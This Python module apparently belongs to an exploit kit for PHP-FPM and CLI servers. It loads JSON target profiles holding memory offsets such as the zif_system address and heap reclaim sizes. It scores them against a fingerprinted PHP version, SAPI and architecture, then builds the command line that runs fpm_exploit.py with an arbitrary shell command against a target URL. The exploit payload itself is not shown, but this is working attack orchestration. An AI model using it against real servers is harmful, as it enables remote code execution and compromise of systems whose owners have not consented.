#!/usr/bin/env python3
"""Profile loading and selection for the persistent-SAPI FPM/CLI chain.

The Apache session-upload-progress chain and this chain are different
primitives: Apache profiles live in ``profiles/*.json``, persistent-SAPI
profiles in ``profiles/fpm/*.json``.  Keeping the catalogs separate avoids
dispatching a mod_php profile to nginx/FPM or a FPM profile to Apache.
"""
from __future__ import annotations

import json
import sys
import urllib.parse
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parent
PROFILE_DIR = ROOT / "profiles" / "fpm"
TOOL = ROOT / "fpm_exploit.py"
SAPIS = ("fpm", "fpm-fcgi", "cli-server")
ARCH_ALIASES = {"amd64": "x86_64", "x64": "x86_64",
                "arm64": "aarch64", "aarch64": "aarch64",
                "x86_64": "x86_64"}


def normalize_arch(arch: str | None) -> str | None:
    if not arch:
        return None
    value = str(arch).lower()
    return ARCH_ALIASES.get(value, value)


def _version_tuple(version: str | None) -> tuple[int, ...]:
    if not version:
        return ()
    try:
        return tuple(int(x) for x in str(version).split("."))
    except ValueError:
        return ()


def list_fpm_profiles() -> list[dict[str, Any]]:
    profiles = []
    for path in sorted(PROFILE_DIR.glob("*.json")):
        if path.name in ("schema.json",):
            continue
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
        if not isinstance(data, dict) or not data.get("name"):
            continue
        profile = dict(data)
        profile["_path"] = str(path)
        profile["sapi"] = str(profile.get("sapi") or "fpm")
        profiles.append(profile)
    return profiles


def load_fpm_profile(name_or_path: str) -> dict[str, Any]:
    path = Path(name_or_path).expanduser()
    if path.is_file():
        data = json.loads(path.read_text(encoding="utf-8"))
        if not isinstance(data, dict):
            raise ValueError(f"{path} is not a profile object")
        data = dict(data)
        data["_path"] = str(path.resolve())
        data["sapi"] = str(data.get("sapi") or "fpm")
        return data
    wanted = name_or_path.removesuffix(".json")
    for profile in list_fpm_profiles():
        if profile["name"] == wanted:
            return profile
    raise ValueError(f"unknown persistent-SAPI profile {name_or_path!r}")


def requirements(profile: dict[str, Any]) -> tuple[bool, list[str]]:
    problems = []
    if not profile.get("rce"):
        problems.append("profile is not marked rce=true")
    if not profile.get("verified"):
        problems.append("profile is not verified")
    if profile.get("sapi") not in SAPIS:
        problems.append(f"unsupported persistent SAPI {profile.get('sapi')!r}")
    lib = profile.get("libphp") or {}
    if not lib.get("zif_system"):
        problems.append("missing libphp.zif_system")
    fpm = profile.get("fpm") or {}
    if not fpm.get("basic_globals"):
        problems.append("missing fpm.basic_globals")
    if not fpm.get("reclaim_pads"):
        problems.append("missing fpm.reclaim_pads")
    if not fpm.get("reclaim_size"):
        problems.append("missing fpm.reclaim_size")
    if not (fpm.get("no_oracle") or {}).get("candidates"):
        problems.append("missing fpm.no_oracle.candidates")
    return not problems, problems


def match_fpm_profiles(fingerprint: dict[str, Any],
                       sapi: str | None = None,
                       arch: str | None = None,
                       limit: int = 8) -> list[dict[str, Any]]:
    target_php = fingerprint.get("php_version")
    target_sapi = sapi or fingerprint.get("sapi") or ""
    target_arch = normalize_arch(arch or fingerprint.get("arch")) or ""
    if target_sapi == "fpm-fcgi":
        target_sapi = "fpm"
    rows = []
    for profile in list_fpm_profiles():
        ok, problems = requirements(profile)
        score = 0
        compatible = ok
        warnings = list(problems)
        if target_php:
            if target_php == profile.get("php_version"):
                score += 100
            else:
                compatible = False
                warnings.append(
                    f"PHP {target_php} != profile {profile.get('php_version')}")
                if _version_tuple(target_php)[:2] == \
                        _version_tuple(profile.get("php_version"))[:2]:
                    score += 20
                else:
                    score -= 40
        if target_sapi:
            if target_sapi in ("fpm-fcgi", "nginx"):
                target_sapi = "fpm"
            if target_sapi == profile.get("sapi"):
                score += 20
            else:
                compatible = False
                score -= 100
                warnings.append(
                    f"SAPI {target_sapi} != profile {profile.get('sapi')}")
        profile_arch = normalize_arch(profile.get("arch"))
        if target_arch and target_arch != "unknown":
            if target_arch == profile_arch:
                score += 10
            else:
                compatible = False
                warnings.append(
                    f"arch {target_arch} != profile {profile.get('arch')}")
        row = dict(profile)
        row.update(score=score, compatible=compatible, warnings=warnings)
        rows.append(row)
    rows.sort(key=lambda p: (p["compatible"], p["score"],
                             p.get("verified", False),
                             _version_tuple(p.get("php_version"))), reverse=True)
    return rows[:limit]


def _origin(url: str) -> str:
    parts = urllib.parse.urlsplit(url)
    if not parts.scheme or not parts.netloc:
        raise ValueError(f"bad URL {url!r}")
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, "", "", ""))


def command(profile: dict[str, Any], url: str, builder: str, cmd: str,
            proof_file: str, *, local_bases: bool = False,
            pid: int | None = None, python: str | None = None) -> list[str]:
    ok, problems = requirements(profile)
    if not ok:
        raise ValueError("; ".join(problems))
    argv = [
        python or sys.executable,
        str(TOOL),
        "--base", _origin(url),
        "--builder", _origin(builder),
        "--version", str(profile["php_version"]),
        "--profile", profile["_path"],
        "--command", cmd,
        "--proof-file", proof_file,
    ]
    if pid is not None:
        argv += ["--pid", str(pid)]
    argv.append("no-oracle")
    if local_bases:
        argv.append("--local-bases")
    return argv


def format_matches(matches: list[dict[str, Any]]) -> list[str]:
    rows = []
    for p in matches:
        flags = []
        if p.get("rce"):
            flags.append("RCE")
        if p.get("verified"):
            flags.append("verified")
        if not p.get("compatible"):
            flags.append("incompatible")
        rows.append(f"{p['name']:<42} {p.get('php_version','?'):<9} "
                    f"{p.get('sapi','?'):<11} {' '.join(flags):<24} "
                    f"{p.get('status','')}")
        for warning in p.get("warnings") or []:
            rows.append(f"    ! {warning}")
    return rows
